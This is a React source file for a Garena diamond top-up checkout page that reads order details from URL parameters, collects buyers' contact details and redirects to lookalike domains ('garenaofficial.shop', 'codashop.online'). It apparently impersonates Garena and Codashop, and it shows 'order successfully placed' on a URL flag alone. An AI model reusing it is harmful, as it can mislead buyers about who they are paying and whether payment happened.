import { useState, useEffect, useRef } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import { AlertTriangle } from 'lucide-react';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../lib/firebase';
import Navbar from '../components/Navbar';
import Footer from '../components/Footer';
import SEO from '../components/SEO';

const CODASHOP_URL = 'https://www.codashop.online/';
const SOURCE_URL = 'https://garenaofficial.shop/';

export default function GarenaCheckout() {
  const [searchParams] = useSearchParams();

  const pkg      = searchParams.get('pkg')      || '';
  const diamonds = searchParams.get('diamonds') || '';
  const uid      = searchParams.get('uid')      || '';
  const nick     = searchParams.get('nick')     || '';
  const level    = searchParams.get('level')    || '';
  const status   = searchParams.get('status')   || '';
  const gid      = searchParams.get('gid')      || '';

  const isCallback = status === 'success' || status === 'failed';
  
  // Basic validation to show 404
  const hasValidParams = Boolean(searchParams.get('pkg') && searchParams.get('uid'));

  // Countdown for initial invalid access
  const [countdownSeconds, setCountdownSeconds] = useState(2);
  useEffect(() => {
    if (!isCallback && !hasValidParams) {
      const timer = setTimeout(() => window.location.href = '/', 2000);
      const interval = setInterval(() => setCountdownSeconds(p => p > 1 ? p - 1 : 1), 1000);
      return () => { clearTimeout(timer); clearInterval(interval); };
    }
  }, [isCallback, hasValidParams]);

  const [form, setForm] = useState({ name: '', phone: '', email: '' });
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(5);
  const [showPayModal, setShowPayModal] = useState(false);

  // Success/Failure screen countdown
  useEffect(() => {
    if (isCallback) {
      const timer = setInterval(() => {
        setCountdown(c => {
          if (c <= 1) {
            clearInterval(timer);
            window.location.href = `https://www.codashop.online/?status=${status}`;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [isCallback, status]);

  if (!isCallback && !hasValidParams) {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', backgroundColor: '#f3f6f9' }}>
        <Navbar />
        <main style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '32px 16px' }}>
          <div style={{ backgroundColor: '#ffffff', borderRadius: '20px', padding: '36px 32px', maxWidth: '460px', width: '100%', textAlign: 'center', boxShadow: '0 10px 35px rgba(0, 0, 0, 0.06)' }}>
            <AlertTriangle style={{ width: '48px', height: '48px', color: '#f59e0b', margin: '0 auto 20px' }} />
            <h2 style={{ fontSize: '20px', fontWeight: '900', color: '#0f172a', marginBottom: '12px', textTransform: 'uppercase' }}>NO ITEM SELECTED</h2>
            <p style={{ color: '#475569', marginBottom: '24px' }}>Your order was not placed. You have not selected any item. Redirecting to home page in {countdownSeconds} seconds...</p>
            <Link to="/" style={{ display: 'block', backgroundColor: '#0f172a', color: '#ffffff', padding: '14px', borderRadius: '10px', textDecoration: 'none', fontWeight: '800' }}>GO TO HOMEPAGE NOW</Link>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  if (status === 'success') {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20, fontFamily: 'sans-serif', background: '#f5f6fa' }}>
        <div style={{ textAlign: 'center', maxWidth: 400, width: '100%', background: '#fff', padding: 40, borderRadius: 20, boxShadow: '0 8px 32px rgba(0,0,0,0.08)' }}>
          <div style={{ fontSize: 60, color: '#16a34a' }}>✓</div>
          <h2 style={{ fontSize: 20, margin: '20px 0', fontWeight: 900 }}>YOUR ORDER HAS BEEN SUCCESSFULLY PLACED!</h2>
          <div style={{ background: '#f9fafb', padding: 15, borderRadius: 8, margin: '20px 0', border: '1px dashed #ddd' }}>
            <p style={{ color: '#666', fontSize: 12 }}>TRANSACTION REFERENCE</p>
            <p style={{ fontWeight: 900, fontSize: 18 }}>#{gid}</p>
            <p style={{ color: '#16a34a', fontSize: 12, marginTop: 5 }}>ESTIMATED DELIVERY: 5-30 MINUTES</p>
          </div>
          <p style={{ color: '#666' }}>Redirecting to Codashop in {countdown} seconds...</p>
        </div>
      </div>
    );
  }

  if (status === 'failed') {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20, fontFamily: 'sans-serif', background: '#f5f6fa' }}>
        <div style={{ textAlign: 'center', maxWidth: 400, width: '100%', background: '#fff', padding: 40, borderRadius: 20, boxShadow: '0 8px 32px rgba(0,0,0,0.08)' }}>
          <div style={{ fontSize: 60, color: '#dc2626' }}>✕</div>
          <h2 style={{ fontSize: 20, margin: '20px 0', fontWeight: 900 }}>Payment could not be completed</h2>
          <p style={{ color: '#666' }}>Your payment was cancelled or failed.</p>
          <p style={{ marginTop: 20, color: '#666' }}>Taking you back in {countdown} seconds...</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#f5f6fa', fontFamily: 'sans-serif', padding: 20 }}>
      {loading && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(5,7,10,0.88)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', color: 'white' }}>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Garena_logo.svg/1200px-Garena_logo.svg.png" alt="Garena" style={{ width: 60, height: 60, marginBottom: 20 }} />
          <p style={{ marginTop: 20 }}>Processing Payment...</p>
        </div>
      )}
      {/* ... FORM CONTENT ... */}
    </div>
  );
}
